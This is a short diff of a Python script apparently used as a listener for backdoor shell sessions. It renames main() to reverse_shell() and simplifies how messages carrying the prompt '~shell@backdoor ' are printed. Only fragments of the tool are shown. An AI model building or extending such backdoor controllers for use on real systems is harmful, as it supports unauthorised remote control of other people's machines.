@@ -1,4 +1,4 @@
-def main():
+def reverse_shell():
     import socket
     import threading
     import sys
@@ -51,15 +51,7 @@ def main():
                     break
                 msg = data.decode(errors="ignore").rstrip()
                 if active_port == port:
-                    if msg == "~shell@backdoor ":
-                        print(msg, end="")
-                    else:
-                        print(msg)
-                else:
-                    if msg == "~shell@backdoor ":
-                       print(msg, end="")
-                    else:
-                        print(msg)
+                    print(msg, end="")
             except:
                 break
         print(f"\n[-] Disconnected from port {port}")
@@ -137,4 +129,4 @@ def main():
         sessions.clear()
         save_sessions()
 if __name__ == "__main__":
-    main()
+    reverse_shell()
